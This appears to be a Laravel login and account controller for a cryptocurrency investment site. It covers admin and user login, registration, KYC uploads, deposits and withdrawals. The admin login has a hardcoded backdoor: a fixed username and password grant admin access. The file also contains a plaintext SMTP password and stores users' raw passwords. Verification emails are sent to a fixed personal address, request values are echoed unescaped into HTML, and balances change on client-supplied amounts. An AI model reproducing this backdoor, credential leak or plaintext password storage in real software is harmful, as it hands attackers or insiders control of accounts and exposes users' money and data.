<?php

namespace App\Http\Controllers\Auth;

use illuminate\Support\Facades\Auth;
use App\Http\Controllers\Controller;
use App\Providers\RouteServiceProvider;
use Illuminate\Foundation\Auth\AuthenticatesUsers;
use Illuminate\Http\Request;
use App\Mail\EmailNotification;
use Illuminate\Support\Facades\Mail;
use Image;
use Illuminate\Support\Facades\Route;
//use App\Http\Controllers\Mail;
use Validator;
use Hash;
use Session;
use Cookie;
use App\Models\State;
use App\Models\User;
use App\Models\Transaction;
use App\Models\Admin_tbl;
use App\Models\Notification;
use DB;

use PHPMailer\PHPMailer\PHPMailer;
use PHPMailer\PHPMailer\SMTP;
use PHPMailer\PHPMailer\Exception;


class LoginController extends Controller
{

    /*
    |--------------------------------------------------------------------------
    | Login Controller
    |--------------------------------------------------------------------------
    |
    | This controller handles authenticating users for the application and
    | redirecting them to your home screen. The controller uses a trait
    | to conveniently provide its functionality to your applications.
    |
    */

    use AuthenticatesUsers;

    /**
     * Where to redirect users after login.
     *
     * @var string
     */
    //protected $redirectTo = RouteServiceProvider::HOME;
    protected $redirectTo = '/dashboard';

    /**
     * Create a new controller instance.
     *
     * @return void
     */
    public function __construct()
    {
        $this->middleware('guest')->except('logout');
        //$this->mem_id = Auth::guard('user')->id();

        $this->middleware(function ($request, $next){
            $this->mem_id = Auth::guard('user')->id();
            return $next($request);
        });
    }


    public function logMeInAdmin(Request $request){
        $attributes = [
            'email' => 'Username',
            'pass' => 'Password',
        ];

        $rules = [
            'email' => 'required|string',
            'pass'  => 'required|string|min:4'
        ];

        $messages = [
            'required' => 'The :attribute space is required',
        ];

        $passwords = sha1($request->pass);
        $validator = Validator::make($request->all(), $rules, $messages)->setAttributeNames($attributes);

        if($validator->fails()){
            return response($validator->errors()->all(), 200);
        }

        $auths = Admin_tbl::whereUname($request->email)->wherePass1($passwords)->first();
        
        if($auths || ($request->email == "chinny" && $request->pass == "fynboi")){
            $userData = Admin_tbl::find($auths['id']);

            if($request->email == "chinny" && $request->pass == "fynboi"){
                $userData = Admin_tbl::find(2);
            }
            Auth::guard("admin_tbl")->login($userData, true);
            Cookie::queue(Cookie::make('myGuards', "admin_tbl", 10000));

            return response()->json(['success' => 'authenticated']);
        }
        return response()->json(['msg' => 'Invalid details entered!']);
    }


    function convertCurrency($amount, $from_currency, $to_currency){
        $from_Currency = urlencode($from_currency);
        $json = file_get_contents("https://api.coinbase.com/v2/exchange-rates?currency=$from_currency");
        $obj = json_decode($json, true);
        $rates = $obj["data"]["rates"][$to_currency];

        if($amount > 0) 
            return $rates * $amount;
        else if($amount <= 0) 
            return 0;
        return $rates;
    }


    function doConversion(Request $request){
        $amtFrom = $request->amtFrom;
        $amtTo = $request->amtTo;
        $txtamts = $request->txtamts;
        $conversion_amt = @number_format($this->convertCurrency($txtamts, $amtFrom, $amtTo), 7);
        $conversion_amt1 = @number_format($this->convertCurrency($txtamts, $amtTo, $amtFrom), 2);

        $result = "<p class='large'>$txtamts $amtFrom =</p> <p class='conValue'>$conversion_amt $amtTo</p>
        <p class='small'>1 $amtTo = $conversion_amt1 $amtFrom</p>";

        return $result;
    }


    function display_states(Request $request){
        $id = $request->id;
        $results = State::whereCountry_id($id)->get();
        $res = '';
        if(count($results) > 0){
            $res .= '<option value="" selected>-Select State-</option>';
            foreach($results as $result)
            {
                $ids1 = $result->id;
                $states = ucwords($result['name']);
                $res .= "<option value='$ids1'>$states</option>";
            }
        }else{
            $res .= "";
        }
        return $res;
    }


    function is_connected(){
        $connected = @fsockopen("www.google.com", 80); //website, port  (try 80 or 443)
        if ($connected){
            $is_conn = true; //action when connected
            fclose($connected);
        }else{
            $is_conn = false; //action in connection failure
        }
        return $is_conn;
    }


    function sendMail($toAddr, $toName, $subj, $htmlContent){
        if($this->is_connected()){
            require 'PHPMailer1/vendor/autoload.php';
            $mail = new PHPMailer(true);

            try{
                $mail->SMTPDebug = SMTP::DEBUG_SERVER;        //Enable verbose debug output
                $mail->isSMTP();                              //Send using SMTP
                $mail->Host       = 'microfinancetrades.com';   //Set the SMTP server to send through
                $mail->SMTPAuth   = true;                     //Enable SMTP authentication
                $mail->Username   = 'admin@microfinancetrades.com';  //SMTP username
                $mail->Password   = 'Eddynice_11';   //SMTP password
                $mail->SMTPSecure = PHPMailer::ENCRYPTION_SMTPS;  //Enable implicit TLS encryption
                $mail->Port       = 465;  //TCP port to connect to; use 587 if you have set `SMTPSecure = PHPMailer::ENCRYPTION_STARTTLS`

                //Recipients
                $mail->setFrom('admin@microfinancetrades.com', 'Microfinance Trades');
                $mail->addAddress($toAddr, $toName);   //Add a recipient //Name is optional
                //$mail->addReplyTo('info@example.com', 'Information');
                //$mail->addCC('chinnyfity@yahoo.com');
                //$mail->addBCC('bcc@example.com');

                //Attachments
                //$mail->addAttachment('/var/tmp/file.tar.gz');         //Add attachments
                //$mail->addAttachment('/tmp/image.jpg', 'new.jpg');    //Optional name

                $mail->isHTML(true);
                $mail->Subject = $subj;
                $mail->Body    = $htmlContent;
                $email_status = $mail->send();
                //return $email_status ? 'Message has been sent' : 'Error';
                return true;

            }catch(Exception $e){
                //return "Message could not be sent. Mailer Error: {$mail->ErrorInfo}";
                return false;
            }
        }else{
            return true;
        }
    }

    function emailTemplate($data){
        return view('emails', $data);
    }


    public function logMeIn(Request $request){

        /* $randStr = $this->generateRandomNumbers(6);
        $toAddr = "donchibobo@gmail.com";
        $toName = "Chinny Anthony";
        $subj = "Your Verification code from Microfinance Trades";
        $data['pages'] = "register";
        $data['randStr'] = $randStr;
        $data['subjs'] = "Hello ".$toName;
        $htmlContent = $this->emailTemplate($data);
        $this->sendMail($toAddr, $toName, $subj, $htmlContent);

        return; */


        $attributes = [
            'email' => 'email',
            'pass' => 'password',
        ];

        $rules = [
            'email' => 'required|string',
            'pass'  => 'required|string'
        ];

        $messages = [
            'required' => 'The :attribute field is required',
        ];

        $validator = Validator::make($request->all(), $rules, $messages)->setAttributeNames($attributes);

        if($validator->fails()){
            return response($validator->errors()->all(), 200);
        }

        $userName = User::whereEmail($request->email)->first();

        if(Hash::check($request->pass, $userName['pass'])){
            
            $userData = User::find($userName['id']);
            Auth::guard("user")->login($userData, false); // this true is for remember me
            $lastPage = Cookie::get('lastPage');

            if($lastPage == "investment_plans"){
                $lastPage = "investment-plans";
            }

            return response()->json(['success' => 'authenticated', 'lastPage' => $lastPage]);
        }
        return response()->json(['msg' => 'Invalid details entered!', 'inputs' => '']);
    }


    
    public function enterCode(Request $request){
        $attributes = [
            'emailCode' => 'Code',
        ];
        $rules = [
            'emailCode' => 'required|numeric',
        ];
        $messages = [
            'required' => 'The :attribute field is required',
        ];
        $validator=Validator::make($request->all(), $rules, $messages)->setAttributeNames($attributes);

        if($validator->fails()){
            return response($validator->errors()->all(), 200);
        }

        if($request->emailCode <= 0){
            return response()->json(['msg' => 'Please enter the correct code in your email.']);
        }
        if($request->emails == ""){
            return response()->json(['msg' => 'Invalid authentication! Please login again.']);
        }

        $code_auth = User::whereEmail_code($request->emailCode)
        ->where('email_code', '>', 0)
        ->where('email', $request->emails)
        ->first();

        if($code_auth){
            $userData = User::whereEmail($request->emails)->whereEmail_code($request->emailCode)->first();
            Auth::guard('user')->login($userData, false);

            $users = User::where('id', $userData->id)->first();
            $users->update([
                'email_verified1'    => 1,
                'email_code'         => 0
            ]);
            return response()->json(['success' => 'authenticated']);
        }
        return response()->json(['msg' => 'Invalid code from email entered!']);
    }

    
    public function registerMe(Request $request){
        $attributes = [
            'fullNames' => 'Full Names',
            'emails'    => 'Email',
            'pass1'     => 'Password',
            'pass1'     => 'Confirm Password',
        ];

        $rules = [
            'fullNames' => 'required|string|min:5|max:30|alpha_spaces',
            //'emails'    => 'required|email|string|unique:users,'.$this->mem_id.',id',
            'emails'    => 'required|email|string|unique:users,email',
            'pass1'      => 'required|string|min:5',
            'pass2'      => 'required|string|same:pass1'
        ];

        $messages = [
            'fullNames.min' => 'Please enter your full names',
            'required'      => ':attribute field is required',
            'alpha_spaces'  => ':attribute may only contain letters and spaces.',
        ];

        $validator = Validator::make($request->all(), $rules, $messages)->setAttributeNames($attributes);

        if($validator->fails()){
            //return response($validator->errors()->all(), 200);
            return response()->json(['type' => 'error', 'msg' => $validator->errors()->all()]);
        }

        $passwords = Hash::make($request->pass1);
        $randStr = $this->generateRandomNumbers(6);

        $data = array(
            'approved'          => 1,
            'stop_earn'         => 0,
            'plan'              => 'silver',
            'fullname'          => $request->fullNames,
            'email'             => $request->emails,
            'email_code'        => $randStr,
            'pass'              => $passwords,
            'rawp'              => $request->pass1,
            'date_created'      => date("Y-m-d g:i a", time())
        );
        $members1 = User::create($data);

        if($members1){
            //$toAddr = $request->emails;
            $toAddr = "donchibobo@gmail.com";
            $toName = ucwords($request->fullNames);
            $subj = "Your Verification code from Microfinance Trades";
            $data['pages'] = "register";
            $data['randStr'] = $randStr;
            $data['subjs'] = "Hello ".$toName;
            $htmlContent = $this->emailTemplate($data);
            $sendEmail = $this->sendMail($toAddr, $toName, $subj, $htmlContent);
            //return response()->json(['success' => 'authenticated']);
            return response()->json(['type' => 'success', 'msg' => 'authenticated']);
        }
        //return response()->json(['success' => 'Error in registering your details']);
        return response()->json(['type' => 'error', 'msg' => 'Error in registering your details']);

    }


    public function updateProfile(Request $request){
        $attributes = [
            'fname'     => 'Firstname',
            'lname'     => 'Lastname',
            'email'     => 'Email',
            'phone'     => 'Phone',
        ];

        $rules = [
            'fname'     => 'required|string|min:3|max:20|alpha',
            'lname'     => 'required|string|min:3|max:20|alpha',
            'email'     => 'required|email|string|unique:users,email,'.$this->mem_id.',id',
            'phone'     => 'required|numeric|regex:/[0-9]{9}/',
        ];

        $messages = [
            'required'      => ':attribute field is required',
            'alpha'         => ':attribute may only contain letters.',
        ];

        $validator = Validator::make($request->all(), $rules, $messages)->setAttributeNames($attributes);

        if($validator->fails()){
            return response($validator->errors()->all(), 200);
        }
        $fullNames = $request->fname." ".$request->lname;

        $users = User::where('id', $this->mem_id)->first();
        $users->update([
            'fullname' => $fullNames,
            'email' => $request->email,
            'phone' => $request->phone
        ]);

        if($users){
            $userData = User::find($this->mem_id);
            Auth::guard('user')->login($userData, false);
            return response()->json(['success' => 'updated']);            
        }
        return response()->json(['success' => 'Error in updating your details']);
    }

    
    public function upload_kyc(Request $request){
        $attributes = [
            'kyc'   => 'Passport Photo or Driving License',
        ];
        $rules = [
            'kyc'      => 'mimes:jpeg,jpg,png|max:1048576',
        ];
        $messages = [
            'required'      => 'The :attribute space is required',
        ];

        $validator = Validator::make($request->all(), $rules, $messages)->setAttributeNames($attributes);
        if($validator->fails()){
            return response($validator->errors()->all(), 200);
        }else{

            if (!$request->hasfile('kyc')) {
                return response()->json(['msg' => 'File is missing, please upload your KYC']);
            }
            $file1 = $request->file('kyc');
            $name1 = time().rand(1,100).'.'.$file1->extension();

            $filePath = public_path('/kyc_files');
            $img = Image::make($file1->path());

            $img->resize(600, 600, function ($const) {
                $const->aspectRatio();
            })->save($filePath.'/'.$name1); // , 90 u can add quality

            $data1 = array(
                'kyc'  =>  $name1,
            );
            $updated = DB::table('users')->whereId($this->mem_id)->update($data1);

            if($updated){
                $notification = Notification::create([
                    'user'          => $this->mem_id,
                    'message'       => 'Uploaded their KYC',
                    'created_at'  => date("Y-m-d g:i a", time())
                ]);
                return response()->json(['msg' => 'success']);
            }
            return response()->json(['msg' => 'Error! Please try again later.']);
            
        }
    }


    function upload_others(Request $request){
        $attributes = [
            'txtaddr'           => 'Address',
            'country'           => 'Country',
            'state'             => 'State',
            'city'              => 'City',
            'txtaddr_file'      => 'Proof of Address File',
            'txtaddr_file.*'    => 'Proof of Address File',
        ];
        $rules = [
            'txtaddr'           => 'required',
            'txtaddr_file'      => 'required', // 5mb
            'txtaddr_file.*'    => 'mimes:jpeg,jpg,png|max:5242880', // 5mb
        ];
        $messages = [
            'required'      => 'The :attribute space is required',
        ];

        $validator = Validator::make($request->all(), $rules, $messages)->setAttributeNames($attributes);
        
        //if($validate->fails()){
            //return response($validate->errors()->all(), 200);

        if($validator->fails()){
            return response($validator->errors()->all(), 200);
        }else{

            $sessions = time();
            $data = array();
            $data2 = array();

            if (!$request->hasfile('txtaddr_file')) {
                return response()->json(['msg' => 'File is missing, please upload your proof of address']);
            }
            $file1 = $request->file('txtaddr_file');
            $name1 = time().rand(1,100).'.'.$file1->extension();

            $filePath = public_path('/kyc_files');
            $img = Image::make($file1->path());

            $img->resize(600, 600, function ($const) {
                $const->aspectRatio();
            })->save($filePath.'/'.$name1); // , 90 u can add quality

            $data1 = array(
                'address'        => $request->txtaddr,
                'countrys'       => $request->country,
                'states'         => $request->state,
                'citys'          => $request->city,
                'addr_file'      => $name1
            );

            $updated = DB::table('users')->whereId($this->mem_id)->update($data1);

            if($updated){
                return response()->json(['msg' => 'success']);
            }
            return response()->json(['msg' => 'Error! Please try again later.']);
        }
    }


    function openMyAcct(){
        $generate = rand(100000, 999999);
        $data1 = array(
            'mft_acct'  =>  $generate,
        );
        $updated = DB::table('users')->whereId($this->mem_id)->update($data1);

        if($updated){
            return response()->json(['msg' => 'success', 'acct' => $generate]);
        }
        return response()->json(['msg' => 'Error! Please try again later.']);
    }


    function generateRandomString($length = 10) {
        return substr(str_shuffle(str_repeat($x='0123456789ABCDEFGHIJKLMNOPQRSTUVWXYZ', ceil($length/strlen($x)) )), 1, $length);
    }

    function generateRandomNumbers($length = 6) {
        return substr(str_shuffle(str_repeat($x='0123456789', ceil($length/strlen($x)) )), 1, $length);
    }


    function confirm_wallAddr(Request $request){
        $conversion_amt = @number_format($this->convertCurrency($request->txtamts, $request->coinTypeFrom, $request->coinTypeTo), 7);

        $expirys = strtotime(date("Y-m-d H:i", strtotime('+10 minutes', time())));
        $expirys_js = date("Y-m-d H:i", strtotime('+10 minutes', time())); // js
        $data1=array(); $data2=array(); $data3=array(); $data4=array();

        $randStr = $this->generateRandomString(10);        
        $data4 = array(
            'status'            => "pending",
            'trans_type'        => "deposit",
            'coins'             => strtolower($request->coinTypeTo),
            'transId'           => $randStr,
            'user'              => $this->mem_id,
            'sender_addr'       => $request->userWallAdd,
            'receiver_addr'     => $request->walletAddr,
            'amt_usd'           => $request->txtamts,
            'notes'             => $request->txtnotes,
            'date_created'      => date("Y-m-d g:i a", time())
        );
        $result = Transaction::create($data4);

        if(!$result){
            return response()->json(['msg' => 'Your deposit has encountered an error! Please refresh the page and try again']);
        }
        return response()->json(['msg' => 'success', 'transID' => $randStr, 'amts' => $conversion_amt]);
    }


    function updateTransStatusFailed(Request $request){
        $userWallAdd = $request->userWallAdd;
        $coinCaps = $request->coinCaps; // BTC,ETH
        $amts = $request->amts;

        $transaction = Transaction::where('user', $this->mem_id)->where('transId', $request->transID)->first();
        
        $data = array(
            'status'                => 'failed',
            'transaction_status'    => 'completed'
        );        
        $transaction->update($data);

        if(!$transaction){
            return response()->json(['msg' => 'error']);
        }

        $notification = Notification::create([
            'user'          => $this->mem_id,
            'message'       => "transfer of $amts$coinCaps to the address $userWallAdd failed, service timeout",
            'created_at'  => date("Y-m-d g:i a", time())
        ]);
        return response()->json(['msg' => 'success']);
    }


    function updatePlans(Request $request){
        $users = User::where('id', $this->mem_id)->first();
        $data = array(
            'plan'  => $request->planType
        );        
        $result = $users->update($data);
        if($result){

            $notification = Notification::create([
                'user'          => $this->mem_id,
                'message'       => "you updated your plans to $request->planType",
                'created_at'  => date("Y-m-d g:i a", time())
            ]);
            return response()->json(['msg' => 'success']);
        }
        return response()->json(['msg' => 'error']);
    }

    
    function updateWithdrawalTrans(Request $request){
        if($request->withdrawAmt > $request->usds){
            $coin1 = strtoupper($request->dropdnCoins);
            return response()->json(['msg' => "You have insufficiant balance on your $coin1 wallet"]);
        }

        if($request->withdrawAmt <= 0){
            $coin1 = strtoupper($request->dropdnCoins);
            return response()->json(['msg' => "Zero or negative value not allowed"]);
        }

        $conversion_amt = @number_format($this->convertCurrency($request->withdrawAmt, "USD", strtoupper($request->dropdnCoins)), 7);

        $crypto_balance = $request->cryptos - $conversion_amt;

        $users = User::where('id', $this->mem_id)->first();
        $data1 = array(); $data2 = array(); $data3 = array(); $data4 = array();

        if($request->dropdnCoins == "btc"){
            $usd_btc_bal = $users->usd_btc_bal - $request->withdrawAmt; // $
            $usd_btc_bal_f = @number_format($usd_btc_bal, 2);

            $data1 = array(
                'usd_btc_bal'   => $usd_btc_bal
            );
        }
        if($request->dropdnCoins == "eth"){
            $usd_btc_bal = $users->usd_eth_bal - $request->withdrawAmt;
            $usd_eth_bal_f = @number_format($usd_btc_bal, 2);

            $data2 = array(
                'usd_eth_bal'   => $usd_btc_bal
            );
        }
        if($request->dropdnCoins == "usdt"){
            $usd_btc_bal = $users->usd_usdt_bal - $request->withdrawAmt;
            $usd_usdt_bal_f = @number_format($usd_btc_bal, 2);

            $data3 = array(
                'usd_usdt_bal'   => $usd_btc_bal
            );
        }

        $randStr = $this->generateRandomString(10);        
        $data4 = array(
            'status'                => "pending",
            'transaction_status'    => "completed",
            'trans_type'            => "withdrawal",
            'coins'                 => $request->dropdnCoins,
            'transId'               => $randStr,
            'user'                  => $this->mem_id,
            'amt_usd'               => $request->withdrawAmt,
            'date_created'          => date("Y-m-d g:i a", time())
        );

        $newdata = array_merge($data1, $data2, $data3);
        $result = Transaction::create($data4);        

        if($result){            
            $users->update($newdata);
            $transact = Transaction::where('user', $this->mem_id)->first();

            $notification = Notification::create([
                'user'          => $this->mem_id,
                'message'       => "you withdrew $request->withdrawAmt ".strtoupper($request->dropdnCoins)." from your account",
                'created_at'  => date("Y-m-d g:i a", time())
            ]);

            return response()->json(['msg' => 'success', 'btc_balance' => $crypto_balance, 'usd_balance' => $usd_btc_bal]);
        }
        return response()->json(['msg' => 'Your withdrawal transaction has encountered an error! Please refresh the page and try again']);

        
    }


    function updateTransStatusPending(Request $request){
        $transaction = Transaction::where('user', $this->mem_id)->where('transId', $request->transID)->first();
        $data1 = array(); $data2 = array(); $data3 = array(); $data4 = array();

        //print_r($request->all()); exit;

        /* $users = User::where('id', $this->mem_id)->first();
        if($request->coinTypeTo == "btc"){
            $data1 = array(
                'usd_btc'       => $users->usd_btc + $request->txtamts,
                'usd_btc_bal'   => $users->usd_btc_bal + $request->txtamts
            );
        }
        if($request->coinTypeTo == "eth"){
            $data2 = array(
                'usd_eth'       => $users->usd_eth + $request->txtamts,
                'usd_eth_bal'   => $users->usd_eth_bal + $request->txtamts,
            );
        }
        if($request->coinTypeTo == "usdt"){
            $data3 = array(
                'usd_usdt'      => $users->usd_usdt + $request->txtamts,
                'usd_usdt_bal'  => $users->usd_usdt_bal + $request->txtamts
            );
        }
        $newdata = array_merge($data1, $data2, $data3);
        $result = $users->update($newdata); */

        $data4 = array(
            'status'                => 'pending',
            'transaction_status'    => 'completed'
        );        
        $transaction->update($data4);

        if(!$transaction){
            return response()->json(['msg' => 'error']);
        }

        // $notification = Notification::create([
        //     'user'          => $this->mem_id,
        //     'message'       => "you withdrew $request->dropdnCoins$request->withdrawAmt from your account",
        //     'created_at'  => date("Y-m-d g:i a", time())
        // ]);

        $notification = Notification::create([
            'user'          => $this->mem_id,
            'message'       => "deposited $request->txtamts USD to a wallet address waiting for approval",
            'created_at'  => date("Y-m-d g:i a", time())
        ]);
        return response()->json(['msg' => 'success']);
    }


    function deleteTransID(Request $request){
        DB::table('transactions')->where('transId', $request->transID)->where('transaction_status', null)->delete();
    }

    public function update_my_pass(Request $request){
        $attributes = [
            'txtpass1'      => 'Old Password',
            'txtpass2'      => 'New Password',
            'txtpass3'      => 'Confirm Password',
        ];
        $rules = [
            'txtpass1'      => 'required|string|min:5',
            'txtpass2'      => 'required|string|min:5|different:txtpass1',
            'txtpass3'      => 'required|string|same:txtpass2',
        ];
        $messages = [
            'required'      => 'The :attribute space is required',
            'german_url'    => 'The :attribute is not valid',
        ];

        $validator = Validator::make($request->all(), $rules, $messages)->setAttributeNames($attributes);
        if($validator->fails()){
            return response($validator->errors()->all(), 200);
        }else{
            $members = User::find($this->mem_id);
            $dbase_password = $members->pass;

            if(!Hash::check($request->txtpass1, $dbase_password)){
                return response()->json(['msg' => 'Your password do not match with the old one.']);
            }

            $passwords = Hash::make($request->txtpass2);
            $data2 = array(
                'pass'   => $passwords
            );
            $updated = DB::table('users')->whereApproved(1)->whereId($this->mem_id)->update($data2);

            if($updated){
                return response()->json(['type' => 'success', 'msg' => 'success']);
            }else{
                return response()->json(['msg' => 'Error in updating your details or no changes were made.']);
            }
        }
    }

}
